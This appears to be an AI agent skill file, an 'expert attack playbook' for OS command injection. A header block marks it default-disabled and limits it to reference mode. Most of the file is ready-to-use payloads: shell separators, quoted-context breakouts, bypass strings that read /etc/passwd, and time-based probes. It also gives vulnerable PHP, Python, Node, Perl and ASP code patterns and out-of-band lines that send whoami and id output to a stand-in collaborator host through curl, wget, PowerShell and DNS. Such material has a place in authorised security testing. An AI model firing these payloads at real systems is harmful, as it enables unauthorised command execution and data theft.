---
name: cmdi-command-injection
description: >-
  Command injection playbook. Use when user input may reach shell commands, process execution, converters, import pipelines, or blind out-of-band command sinks.
---

# SKILL: OS Command Injection — Expert Attack Playbook

<!-- zhiyugo:contract:start -->
## ZhiyuGo workflow

Catalog mirror: `role=leaf`, `risk=active`, `default=disabled`. Trusted `policy.json` remains authoritative.

- Keep this default-disabled workflow in planning and reference mode. Catalog body inspection does not authorize network interaction or state changes.
- Define an exact in-scope subject, stable baseline, one-variable test, negative control, expected evidence, and stop condition before any future activation.
- The lightweight kernel supports bounded GET/HEAD requests, file reads/searches, and explicit-port TCP connect scans only; do not emulate POST, browser, shell, or exploit operations.
- Separate a candidate hypothesis from a verified finding and cite Evidence IDs.
<!-- zhiyugo:contract:end -->

> **Technical reference scope**: Expert command injection techniques. Covers all shell metacharacters, blind injection, time-based detection, OOB exfiltration, polyglot payloads, and real-world code patterns. Pay particular attention to subtle injection through unexpected input vectors.

## 0. RELATED ROUTING

Before deeper analysis, consider these catalog routes:
- `upload-insecure-files` when the shell sink is part of a broader upload, import, or conversion workflow

### First-pass payload families

| Context | Start With | Backup |
|---|---|---|
| generic shell separator | `;id` | `&&id` |
| quoted argument | `";id;"` | `';id;'` |
| blind timing | `;sleep 5` | `& timeout /T 5 /NOBREAK` |
| command substitution | `$(id)` | `` `id` `` |
| out-of-band DNS | `;nslookup token.collab` | Windows `nslookup` variant |

```text
cat$IFS/etc/passwd
{cat,/etc/passwd}
%0aid
```

---

## 1. SHELL METACHARACTERS (INJECTION OPERATORS)

These characters break out of the command context and inject new commands:

| Metacharacter | Behavior | Example |
|---|---|---|
| `;` | Runs second command regardless | `dir; whoami` |
| `\|` | Pipes stdout to second command | `dir \| whoami` |
| `\|\|` | Run second only if first FAILS | `dir \|\| whoami` |
| `&` | Run second in background (or sequenced in Windows) | `dir & whoami` |
| `&&` | Run second only if first SUCCEEDS | `dir && whoami` |
| `$(cmd)` | Command substitution | `echo $(whoami)` |
| `` `cmd` `` | Command substitution (backtick) | `` echo `whoami` `` |
| `>` | Redirect stdout to file | `cmd > /tmp/out` |
| `>>` | Append to file | `cmd >> /tmp/out` |
| `<` | Read file as stdin | `cmd < /etc/passwd` |
| `%0a` | Newline character (URL-encoded) | `cmd%0awhoami` |
| `%0d%0a` | CRLF | Multi-command injection |

---

## 2. COMMON VULNERABLE CODE PATTERNS

### PHP
```php
$dir = $_GET['dir'];
$out = shell_exec("du -h /var/www/html/" . $dir);
// Inject: dir=../ ; cat /etc/passwd
// Inject: dir=../ $(cat /etc/passwd)

exec("ping -c 1 " . $ip);          // $ip = "127.0.0.1 && cat /etc/passwd"
system("convert " . $file);        // ImageMagick RCE
passthru("nslookup " . $host);     // $host = "x.com; id"
```

### Python
```python
import os
os.system("curl " + url)            # url = "x.com; id"
subprocess.call("ls " + path, shell=True)  # shell=True is the key vulnerability
os.popen("ping " + host)
```

### Node.js
```javascript
const { exec } = require('child_process');
exec('ping ' + req.query.host, ...);  // host = "x.com; id"
```

### Perl
```perl
$dir = param("dir");
$command = "du -h /var/www/html" . $dir;
system($command);
// Inject dir field: | cat /etc/passwd
```

### ASP (Classic)
```vb
szCMD = "type C:\logs\" & Request.Form("FileName")
Set oShell = Server.CreateObject("WScript.Shell")
oShell.Run szCMD
// Inject FileName: foo.txt & whoami > C:\inetpub\wwwroot\out.txt
```

---

## 3. BLIND COMMAND INJECTION — DETECTION

When response shows no command output:

### Time-Based Detection
```bash
# Linux:
; sleep 5
| sleep 5
$(sleep 5)
`sleep 5`
& sleep 5 &

# Windows:
& timeout /T 5 /NOBREAK
& ping -n 5 127.0.0.1
& waitfor /T 5 signal777
```
Compare response time without payload vs with payload. 5+ second delay = confirmed.

### OOB via DNS
```bash
# Linux:
; nslookup BURP_COLLAB_HOST
; host `whoami`.BURP_COLLAB_HOST
$(nslookup $(whoami).BURP_COLLAB_HOST)

# Windows:
& nslookup BURP_COLLAB_HOST
& nslookup %USERNAME%.BURP_COLLAB_HOST
```

### OOB via HTTP
```bash
# Linux:
; curl http://BURP_COLLAB_HOST/`whoami`
; wget http://BURP_COLLAB_HOST/$(id|base64)

# Windows:
& powershell -c "Invoke-WebRequest http://BURP_COLLAB_HOST/$(whoami)"
```

### OOB via Out-of-Band File
```bash
; id > /var/www/html/RANDOM_FILE.txt
# Then access: https://target.com/RANDOM_FILE.txt
```

---

## 4. INJECTION CONTEXT VARIATIONS

### Within Quoted String
```bash
command "INJECT"
# Inject: " ; id ; "
# Result: command "" ; id ; ""
```

### Within Single-Quoted String
```bash
command 'INJECT'
# Inject: '; id;'
# Result: command ''; id;''
```

### Within Backtick Execution
```bash
output=`command INJECT`
# Inject: x`; id ;`
```

### File Path Context
```bash
cat /var/log/INJECT
# Inject: ../../../etc/passwd (path traversal)
# Inject: access.log; id (command injection)
```

---

## Detailed reference

Inspect [TECHNIQUE_REFERENCE.md](TECHNIQUE_REFERENCE.md) through explicit catalog resource tooling only when one of these advanced branches is required; the current Run does not load it automatically:

- 5. PAYLOAD LIBRARY
- 6. FILTER BYPASS TECHNIQUES
- 7. COMMON INJECTION ENTRY POINTS
- 8. BLIND INJECTION DECISION TREE
- 9. ADVANCED WAF BYPASS TECHNIQUES
- 10. PHP disable_functions BYPASS PATHS
- 11. COMPONENT-LEVEL COMMAND INJECTION
- 12. WINDOWS CMD.EXE VS POWERSHELL INJECTION MATRIX
- … plus 2 additional sections
